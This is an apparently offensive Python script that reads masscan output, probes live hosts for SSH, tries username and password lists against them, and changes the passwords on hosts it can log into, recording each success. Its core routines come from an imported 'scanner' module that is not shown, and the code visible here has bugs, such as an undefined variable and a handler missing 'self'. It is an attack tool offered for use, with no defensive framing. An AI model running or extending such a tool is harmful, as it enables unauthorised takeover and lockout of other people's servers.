#!/usr/bin/env python
# coding=utf-8

import sys
import signal
import asyncio
from dataclasses import dataclass
from asyncio.unix_events import _UnixSelectorEventLoop as LOOP

from scanner import Javise

import nest_asyncio
nest_asyncio.apply()

@dataclass(init=True)
class Tony():
    enemise: list
    usernames: list
    old_pwd: list
    new_pwd: str
    change: bool
    pwd_file: str
    mass_file: str
    output: str = None
    pwds: list = None
    recorded: bool = False
    loop: LOOP = asyncio.get_event_loop()

    def attack(self):
        if self.pwd_file:
            try:
                with open(pwd_file) as f:
                    for x in f:
                        self.pwds.append(x.rstrip())
            except Exception as e:
                print(f'\033[0;31[-]  Error: {e}\033[31m')
        if self.pwds and self.old_pwd:
            self.pwds.extend(self.old_pwd)
        self.loop.add_signal_handler(signal.SIGTERM, self.signal_handler)
        self.mass_res = set()
        if self.change and self.mass_file:
            try:
                with open(self.mass_file, 'rb') as f:
                    mass_data = f.read()
                    tasks = Javise.create_actions(
                        self.loop.run_until_complete(Javise.parse_masscan_results(mass_data)),
                        self.usernames, self.pwds, self.new_pwd)
                    self.mass_res = self.loop.run_until_complete(asyncio.gather(*tasks))
                    if self.mass_res:
                        Javise.save_results(self.mass_res)
            except BaseException as e:
                print(f'\033[0;31[-]  {e}\033[31m')
        self.alived_enemise = self.loop.run_until_complete(self.search_alive(self.enemise, self.loop))
        self.loop.run_until_complete(Javise.record(self.alived_enemise))
        #if self.change:
        #    self.loop.run_until_complete(self.try2change_enemy())
        self.loop.run_until_complete(self.try2change_enemy())

    async def try2change_enemy(self):
        for enemy in filter(lambda x:'ssh' in x[1], self.alived_enemise.items()):
            enemy_name = enemy[0]
            if enemy_name in self.mass_res:
                continue
            status = await Javise.change_enemy(enemy_name, self.usernames, self.old_pwd, self.new_pwd)
            if status:
                self.alived_enemise[enemy_name].append('change_seccess')

    @classmethod
    async def search_alive(cls, enemise, loop=None):
        if not loop:
            loop = asyncio.get_event_loop()
        searchsploit = [
            Javise.search_weak_enemy(enemise),
            Javise.search_alive_enemy(enemise)
        ]
        sshed, pinged = loop.run_until_complete(asyncio.gather(*searchsploit))
        results = Javise.resharp_results(sshed, pinged)
        return results

    def signal_handler():
        print('[+] receive kill signal, going to kill ALL')
        Javise.kill_all(3)
        if self.alived_enemise and not self.recorded:
            Javise.record(self.alived_enemise)
        sys.exit(0)

def main():
    commands = Javise.TurnOn()
    IronMan = Tony(**commands.__dict__)
    IronMan.attack()

if __name__ == '__main__':
    main()
